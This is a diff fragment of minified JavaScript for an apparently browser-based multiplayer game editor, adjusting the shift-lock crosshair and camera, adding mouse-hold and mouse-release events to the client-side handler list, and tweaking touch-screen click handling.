+      if((fpm||S.sl)&&document.pointerLockElement===cv){const rc=cv.getBoundingClientRect();xh.style.left=(rc.left+rc.width/2)+'px';xh.style.top=(rc.top+rc.height/2)+'px';if(S.slimg){if(xh.dataset.im!==S.slimg){xh.dataset.im=S.slimg;xh.style.cssText+=';width:32px;height:32px;margin:-16px 0 0 -16px;border-radius:0;box-shadow:none;background:url("'+String(S.slimg).replace(/"/g,'%22')+'") center/contain no-repeat'}}else if(xh.dataset.im){xh.dataset.im='';xh.style.background='#fff';xh.style.width=xh.style.height='6px';xh.style.margin='-3px 0 0 -3px';xh.style.borderRadius='50%';xh.style.boxShadow='0 0 0 1px rgba(0,0,0,.65)'}xh.style.display='block'}else xh.style.display='none'}
     const hide=!(S.cm&&S.cm.mode==='part')&&camD<(avHid?1.5:1.1);if(hide!==avHid){avHid=hide;avVis(!hide)}
     S.slo=(S.slo||0)+((S.sl?1.9:0)-(S.slo||0))*(1-Math.exp(-dt*10));const so=S.slo*Math.min(1,camD/2.5);
     cam.x=fx-f[0]*camD+Math.cos(cam.yaw)*so;cam.y=fy-f[1]*camD;cam.z=fz-f[2]*camD+Math.sin(cam.yaw)*so;camScript(dt,f);accCamClip(true)}}else{accCamClip(false);camF=null;camD=null;fpPrev=false;slPrev=false;{const xh=document.getElementById('fp-x');if(xh)xh.style.display='none'}if(avHid){avHid=false;avVis(true)}}
@@ -6083,7 +6119,7 @@ function dropOn(d,t){if(!dropOK(d,t))return;const ps=dragParts(d);let msg0='';
    Every player runs the game on their own computer, so "server side" works by telling every other player's computer to run the very same block
    (only the position of the block is sent, never code, so nothing can be injected). "client side" blocks only ever run on the computer that reached them,
    and are skipped on the other players when they replay a server side block. */
-const LOCALH={gphas:1,standstill:1,landed:1,touched:1,clicked:1,prompt:1,key:1,keydrop:1,keyheld:1,keyrel:1,chat:1,chatany:1,guiclick:1,guithisclick:1,itemhold:1,itemunhold:1,screenclick:1};
+const LOCALH={gphas:1,standstill:1,landed:1,touched:1,clicked:1,prompt:1,key:1,keydrop:1,keyheld:1,keyrel:1,chat:1,chatany:1,guiclick:1,guithisclick:1,itemhold:1,itemunhold:1,screenclick:1,mouseheld:1,mouserel:1};
 const RSKIP={airesponse:1,visualize:1,unvisualize:1,move:1,turn:1,goto:1,jump:1,animate:1,say:1,color:1,walkanim:1,jumpanim:1,idleanim:1,fallanim:1,holdanim:1,holdwalkanim:1,fov:1,camset:1,camreset:1,shiftlockon:1,shiftlockoff:1,pspeed:1,lighting:1,playercol:1,ragdollex:1,playercolon:1,playercoloff:1,tweenset:1,
   givebadge:1,awardbadge:1,giveattr:1,removeattr:1,giveitem:1,removeitem:1,accadd:1,accrem:1,accwear:1,accstrip:1,kick:1,ban:1,addplayer:1,randplayer:1,getcount:1,print:1,setvol:1};
 const RSELF={tweensize:1,tweentrans:1,tweencolor:1,transparency:1,kill:1,pushparent:1};
@@ -7014,7 +7050,7 @@ setInterval(function(){const w=document.getElementById('bb-who');if(w)w.textCont
   holdBtn('#mt-jump','Space',' ');holdBtn('#mt-up','KeyE','e');holdBtn('#mt-dn','KeyQ','q');
   const slBtn=root.querySelector('#mt-sl');
   slBtn.addEventListener('click',function(){
-    try{if(playing&&S.sla)S.sl=!S.sl}catch(e){}   /* no mouse lock on a touch screen, so just flip the mode */
+    try{if(playing&&S.sla&&!S.slf)S.sl=!S.sl}catch(e){}   /* no mouse lock on a touch screen, so just flip the mode */
   });
   /* the "click the game if the mouse did not lock" warning makes no sense on touch */
   try{const lw=lockWarn;lockWarn=function(){};void lw}catch(e){}
@@ -7086,7 +7122,7 @@ setInterval(function(){const w=document.getElementById('bb-who');if(w)w.textCont
     if(playing){
       e.stopImmediatePropagation();
       if(e.type==='pointerup'&&was===1&&tapOk&&performance.now()-p.t<320){
-        try{lcT=performance.now();screenClick();playClick(e)}catch(x){}
+        try{lcT=performance.now();screenClick(e);playClick(e)}catch(x){}
       }
     }else if(was>=2){e.stopImmediatePropagation()}
     if(pts.size<2){pinch0=0;mid0=null}
